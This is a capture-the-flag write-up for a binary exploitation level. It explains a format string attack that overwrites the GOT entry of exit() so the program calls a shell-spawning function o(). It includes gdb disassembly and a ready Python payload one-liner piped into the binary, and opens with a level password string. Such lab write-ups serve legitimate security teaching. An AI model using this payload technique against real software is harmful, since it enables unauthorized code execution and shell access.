# Level5
```bash
su level5 #0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```

## Steps
In this binary we can see that function `o()` calls `/bin/sh` however it is not part of the execution flow.     
We also notice that function `n()` called by `main` uses `printf` and `exit`. 

Since RELRO (Relocation Read-Only) protection is off, we can use a **format string attack** to modify the **Global Offset Table**.    
By replacing the `.got.plt` relocation address of `exit()` to `o()`, the `n()` function will call `o()` instead of `exit()` and open a shell prompt for us.    

External function call -> PLT (Procedure Linkage Table) -> GOT (Global Offset Table).

First we must find `exit()` in the GOT
```bash
gdb level5
(gdb) disass exit

Dump of assembler code for function exit@plt:
   0x080483d0 <+0>:	jmp    *0x8049838
   0x080483d6 <+6>:	push   $0x28
   0x080483db <+11>:	jmp    0x8048370
End of assembler dump.

(gdb) p *0x08049838 
$1 = 134513622	; 0x80483d6 this is the exit relocation address in the GOT that we want to replace with o() address
```

```bash
python -c "print '\x08\x04\x98\x38'[::-1] + '%134513824d' + '%4\$n'" > /tmp/inj5
cat /tmp/inj5 - | ./level5 | tr -d " "
